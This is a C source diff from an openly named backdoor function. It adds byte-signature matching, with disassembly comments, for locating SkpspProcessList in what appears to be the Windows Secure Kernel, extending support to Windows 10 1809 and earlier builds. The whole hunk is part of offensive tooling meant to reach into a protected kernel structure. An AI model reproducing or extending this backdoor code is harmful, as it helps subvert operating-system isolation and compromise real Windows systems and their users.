@@ -1082,12 +1082,24 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                         .text:0000000140003DA1      lea     r8, SkpspProcessList
                         .text:0000000140003DA8      lea     rcx, [rdi+0B0h]
                         .text:0000000140003DAF      cmp     [rdx], r8
-                        .text:0000000140003DB2      jnz     loc_140046B73
+                        .text:0000000140003DB2      jnz     loc_140046B73                        
                 */
-                if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
-                    *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
-                    *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
-                    *(p + 0x11) == 0x0f && *(p + 0x12) == 0x85)
+                if ((*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                     *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
+                     *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                     *(p + 0x11) == 0x0f && *(p + 0x12) == 0x85) ||
+                /*
+                    Windows 10 1809 and earlier variation:
+
+                        .text:000000014004BA0F      lea     rax, SkpspProcessList
+                        .text:000000014004BA16      add     rcx, 0B0h
+                        .text:000000014004BA1D      cmp     [rdx], rax
+                        .text:000000014004BA20      jz      short loc_14004BA29
+                */
+                     (*(p + 0x00) == 0x48 && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                      *(p + 0x07) == 0x48 && *(p + 0x08) == 0x81 && *(p + 0x09) == 0xc1 &&
+                      *(p + 0x0e) == 0x48 && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                      *(p + 0x11) == 0x74))
                 {
                     // get operand displacement
                     int32_t disp = *(int32_t *)(p + 3) + 7;
